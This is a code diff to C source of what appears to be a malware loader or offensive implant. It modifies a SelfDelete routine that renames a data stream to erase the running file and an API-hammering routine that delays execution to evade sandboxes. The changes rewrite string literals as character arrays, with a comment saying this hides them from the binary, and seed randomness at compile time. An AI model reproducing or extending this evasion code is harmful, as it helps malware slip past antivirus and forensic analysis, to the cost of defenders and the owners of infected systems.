@@ -56,7 +56,7 @@ BOOL SelfDelete(IN PVX_TABLE pVxTable) {
     FILE_DISPOSITION_INFORMATION Delete = { 0 };
 
     PFILE_RENAME_INFO pRename = NULL;
-    LPCWSTR lpNewStream = L":NEW";
+    wchar_t lpNewStream[] = { ':', 'N', 'E', 'W', '\0' };
     SIZE_T sStreamLenght = wcslen(lpNewStream) * sizeof(wchar_t);
     SIZE_T sRename = sizeof(FILE_RENAME_INFO) + sStreamLenght;
 
@@ -97,7 +97,8 @@ BOOL SelfDelete(IN PVX_TABLE pVxTable) {
     // The NtCreateFile syscall needs the path as part of the ObjectAttributes structure in the following format
     // \??\C:\...\...
     // The following prepends the \??\ to the path.
-    swprintf_s(szNtPath, MAX_PATH * 2, L"\\??\\%s", szPath);
+    wchar_t szFormat[] = { '\\', '?', '?', '\\', '%', 's', '\0' };
+    swprintf_s(szNtPath, MAX_PATH * 2, szFormat, szPath);
 
     /// Rename data stream 
     // Copy the path to a UNICODE_STRING structure to use as the ObjectName
@@ -168,6 +169,9 @@ BOOL ApiHammering(IN PVX_TABLE pVxTable, IN DWORD dwStress) {
 
     PRINTA("\n[~~~] Delaying execution via API Hammering...\n");
 
+    // Initialize temporary file name as character array, in order to hide it from the binary.
+    wchar_t szTmpFileName[] = { 'd', 'a', 't', 'a', '.', 't', 'm', 'p', '\0' };
+
     BOOL bState = TRUE;
     NTSTATUS STATUS = NULL; 
 
@@ -199,7 +203,8 @@ BOOL ApiHammering(IN PVX_TABLE pVxTable, IN DWORD dwStress) {
     }
 
     // Format file path for NtCreateFile
-    wsprintf(szPath, L"\\??\\%s%s", szTmpPath, API_HAMMERING_TMPFILENAME);
+    wchar_t szFormat[] = { '\\', '?', '?', '\\', '%', 's', '%', 's', '\0' }; 
+    wsprintf(szPath, szFormat, szTmpPath, szTmpFileName);
 
     // Copy the path to a UNICODE_STRING structure to use as the ObjectName
     RtlInitUnicodeString(&objName, szPath);
@@ -221,7 +226,7 @@ BOOL ApiHammering(IN PVX_TABLE pVxTable, IN DWORD dwStress) {
 
         // Generate random data
         pRandBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sBufferSize);
-        srand(time(NULL));
+        srand(RandomCompileTimeSeed());
         Random = rand() % 0xFF;
         memset(pRandBuffer, Random, sBufferSize);
 
